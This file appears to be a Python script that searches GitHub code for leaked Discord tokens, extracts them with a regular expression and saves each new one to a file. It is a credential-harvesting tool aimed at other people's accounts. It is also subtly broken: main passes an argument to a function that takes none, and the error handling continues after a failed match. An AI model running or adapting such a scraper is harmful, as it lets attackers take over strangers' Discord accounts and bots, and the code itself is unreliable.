#!/usr/bin/env python3
# encoding: utf-8

import yaml
from github import Github
import base64
import re

TOKEN_RE = re.compile('M[A-Za-z0-9-_.]{58}')

def get_gh():
    with open('config.yml', 'r') as f:
        cfg = yaml.load(f)

    if 'gh_token' in cfg:
        gh = Github(cfg['gh_token'])
    else:
        gh = Github(cfg['gh_username'], cfg['gh_password'])
    return gh


def scrape():
    gh = get_gh()

    for f in gh.search_code('discord Mz'):
        try:
            code = base64.b64decode(f.content).decode()
            token = re.search(TOKEN_RE, code).group(0)
        except KeyboardInterrupt:
            return
        except:
            print('Error parsing result.')
        else:
            write_token(token)


def write_token(token):
    global tokens
    global f

    if token not in tokens:
        tokens.add(token)
        f.write(token + '\n')
        print('Found new token', token)


def main():
    global tokens
    global f

    tokens = set()
    f = open('tokens.txt', 'w')

    scrape(get_gh())

    f.close()


if __name__ == '__main__':
    main()
